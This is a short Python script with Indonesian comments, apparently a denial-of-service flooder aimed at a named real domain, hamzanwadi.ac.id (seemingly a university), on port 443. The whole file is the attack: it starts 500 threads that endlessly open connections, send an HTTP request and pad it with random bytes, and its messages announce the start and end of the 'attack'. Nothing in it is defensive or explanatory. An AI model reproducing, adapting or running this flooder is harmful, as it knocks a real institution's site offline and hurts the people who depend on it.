import os
import socket
import threading
import random

# Configuration
target = "hamzanwadi.ac.id"
port = 443  # Port target
threads = 500  # Jumlah thread
attack_time = 60  # Durasi serangan dalam detik

# Membuat payload HTTP
payload = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target)

def ddos():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(payload.encode('utf-8'))
            for _ in range(10):
                s.send(random._urandom(1024))  # Kirim data acak
            s.close()
        except:
            pass

# Mulai serangan
print(f"Memulai serangan pada {target} selama {attack_time} detik...")
threads_list = []
for i in range(threads):
    t = threading.Thread(target=ddos)
    t.start()
    threads_list.append(t)

try:
    for t in threads_list:
        t.join(timeout=attack_time)
except KeyboardInterrupt:
    print("Serangan dihentikan.")

print("Serangan selesai.")
